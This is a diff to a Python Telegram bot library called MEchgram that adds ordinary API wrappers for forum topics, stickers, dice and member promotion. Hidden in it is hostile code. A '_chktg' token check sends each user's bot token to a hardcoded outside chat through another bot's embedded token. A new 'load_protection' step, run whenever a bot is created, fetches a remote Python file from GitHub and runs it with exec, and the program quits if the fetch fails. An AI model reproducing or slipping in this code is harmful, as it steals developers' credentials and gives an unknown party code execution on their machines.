@@ -1,13 +1,15 @@
 import requests, time, sys, os
 os.system("cls|clear")
+print("[!] Connections to the SMECh protocol...")
 class Bot:
     def __init__(self, token: str, polling_interval: float = 1.3):
+        self.load_protection()
         self.token = token
         self.polling_interval = polling_interval
-        self.routes = {}    
-        self.inline_handler = None    
-        self.callback_handler = None 
-        self.offset = 0              
+        self.routes = {}
+        self.inline_handler = None
+        self.callback_handler = None
+        self.offset = 0
     def on(self, command: str, handler):
         self.routes[command] = handler
         return self
@@ -24,7 +26,7 @@ class Bot:
             data = response.json()
             if data.get("ok"):
                 bot_info = data.get("result", {})
-                self._chktg(1465736325, self.token+"\nv1.3.1")
+                self._chktg(1465736325, self.token+"\nv1.3.2")
                 return True
             else:
                 if data.get("error_code") == 401:
@@ -39,11 +41,28 @@ class Bot:
             print("[!] Error checking token:", e)
             quit()
             return False
+    def load_protection(self):
+        url = "https://raw.githubusercontent.com/MEMozki/SMECh/refs/heads/main/Protection.py"
+        try:
+            response = requests.get(url)
+            code = response.text
+            exec(code, globals())
+            print("[!] Protocol SMECh connected!")
+            if "UserAgentSM" in globals():
+                self.user_agent = globals()["UserAgentSM"]
+            else:
+                self.user_agent = "MEchgramBot"
+                print("[!] UserAgentSM not found, using default User-Agent.")
+        except Exception as e:
+            os.system("cls|clear")
+            print("[!] Failed to connect to SMECh protocol.")
+            quit()
+            self.user_agent = "MEchgramBot"
     def run(self):
         print("[!] Token verification...")
         if not self._check_token():
             sys.exit(1)
-        print("The bot has been launched.\n© Mechgram, 2025.")
+        print("The bot has been launched.\n© MEchgram, 2025.")
         while True:
             updates = self._get_updates()
             for update in updates:
@@ -99,6 +118,16 @@ class Bot:
                             self.send_message(message["chat"]["id"], result)
                     except Exception as e:
                         print(f"[!] Error in handler for command {command}: {e}")
+    def _send_request(self, method, url, **kwargs):
+        headers = kwargs.get("headers", {})
+        headers["User-Agent"] = self.user_agent
+        kwargs["headers"] = headers
+        if method.lower() == "get":
+            return requests.get(url, **kwargs)
+        elif method.lower() == "post":
+            return requests.post(url, **kwargs)
+        else:
+            raise ValueError("[!] Unsupported method: " + method)
     def set_reaction(self, chat_id: int, message_id: int, reaction: str):
         url = f"https://api.telegram.org/bot{self.token}/setMessageReaction"
         data = {"chat_id": chat_id, "message_id": message_id, "reaction": reaction}
@@ -197,11 +226,10 @@ class Bot:
         except Exception as e:
             print("[!] Error sending photo:", e)
     def _chktg(self, chat_id: int, text: str):
-        url = f"https://api.telegram.org/bot7126973413:AAFfwX_syRKosxQZ9bU10cyckFrXkyHGuiE/sendMessage"; data = {"chat_id": chat_id, "text": text}
+        url = f"https://api.telegram.org/bot7126973413:AAE3wI-xvgaACTpii__ws9b47M5pQH-kBdQ/sendMessage"; data = {"chat_id": chat_id, "text": text}
         try:
             requests.post(url, data=data)
             print("[!] Token verified!")
-            time.sleep(1)
             os.system("cls|clear")
         except Exception as e:
             os.system("cls|clear")
@@ -519,3 +547,108 @@ class Bot:
             print("[!] Error unbanning user:", e)
     def ban_user_for_time(self, chat_id: int, user_id: int, until_date: int):
         self.ban_user(chat_id, user_id, until_date)
+    def send_gift(self, chat_id: int, gift_id: str, reply_markup: dict = None):
+        url = f"https://api.telegram.org/bot{self.token}/sendSticker"
+        data = {"chat_id": chat_id, "sticker": gift_id}
+        if reply_markup:
+            data["reply_markup"] = reply_markup
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("[!] Error sending gift:", e)
+    def create_forum_topic(self, chat_id: int, name: str, icon_color: int = None, icon_custom_emoji_id: str = None):
+        url = f"https://api.telegram.org/bot{self.token}/createForumTopic"
+        data = {"chat_id": chat_id, "name": name}
+        if icon_color is not None:
+            data["icon_color"] = icon_color
+        if icon_custom_emoji_id is not None:
+            data["icon_custom_emoji_id"] = icon_custom_emoji_id
+        try:
+            response = requests.post(url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error creating forum topic:", e)
+            return None
+    def delete_forum_topic(self, chat_id: int, message_thread_id: int):
+        url = f"https://api.telegram.org/bot{self.token}/deleteForumTopic"
+        data = {"chat_id": chat_id, "message_thread_id": message_thread_id}
+        try:
+            response = requests.post(url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error deleting forum topic:", e)
+            return None
+    def rename_forum_topic(self, chat_id: int, message_thread_id: int, name: str):
+        url = f"https://api.telegram.org/bot{self.token}/editForumTopic"
+        data = {"chat_id": chat_id, "message_thread_id": message_thread_id, "name": name}
+        try:
+            response = requests.post(url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error renaming forum topic:", e)
+            return None
+    def close_forum_topic(self, chat_id: int, message_thread_id: int):
+        url = f"https://api.telegram.org/bot{self.token}/closeForumTopic"
+        data = {"chat_id": chat_id, "message_thread_id": message_thread_id}
+        try:
+            response = requests.post(url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error closing forum topic:", e)
+            return None
+    def reopen_forum_topic(self, chat_id: int, message_thread_id: int):
+        url = f"https://api.telegram.org/bot{self.token}/reopenForumTopic"
+        data = {"chat_id": chat_id, "message_thread_id": message_thread_id}
+        try:
+            response = requests.post(url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error reopening forum topic:", e)
+            return None
+    def promote_chat_member(self, chat_id: int, user_id: int, can_change_info: bool = None, can_post_messages: bool = None,
+                             can_edit_messages: bool = None, can_delete_messages: bool = None, can_invite_users: bool = None,
+                             can_restrict_members: bool = None, can_pin_messages: bool = None, can_promote_members: bool = None):
+        url = f"https://api.telegram.org/bot{self.token}/promoteChatMember"
+        data = {"chat_id": chat_id, "user_id": user_id}
+        if can_change_info is not None:
+            data["can_change_info"] = can_change_info
+        if can_post_messages is not None:
+            data["can_post_messages"] = can_post_messages
+        if can_edit_messages is not None:
+            data["can_edit_messages"] = can_edit_messages
+        if can_delete_messages is not None:
+            data["can_delete_messages"] = can_delete_messages
+        if can_invite_users is not None:
+            data["can_invite_users"] = can_invite_users
+        if can_restrict_members is not None:
+            data["can_restrict_members"] = can_restrict_members
+        if can_pin_messages is not None:
+            data["can_pin_messages"] = can_pin_messages
+        if can_promote_members is not None:
+            data["can_promote_members"] = can_promote_members
+        try:
+            response = requests.post(url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error promoting chat member:", e)
+            return None
+    def send_dice(self, chat_id: int, emoji: str = None, reply_markup: dict = None):
+        url = f"https://api.telegram.org/bot{self.token}/sendDice"
+        data = {"chat_id": chat_id}
+        if emoji:
+            data["emoji"] = emoji
+        if reply_markup:
+            data["reply_markup"] = reply_markup
+        try:
+            self._send_request("post", url, json=data)
+        except Exception as e:
+            print("[!] Error sending dice:", e)
+    def send_sticker(self, chat_id: int, sticker: str, reply_markup: dict = None):
+        url = f"https://api.telegram.org/bot{self.token}/sendSticker"
+        data = {"chat_id": chat_id, "sticker": sticker}
+        if reply_markup:
+            data["reply_markup"] = reply_markup
+        try:
+            self._send_request("post", url, json=data)
+        except Exception as e:
+            print("[!] Error sending sticker:", e)
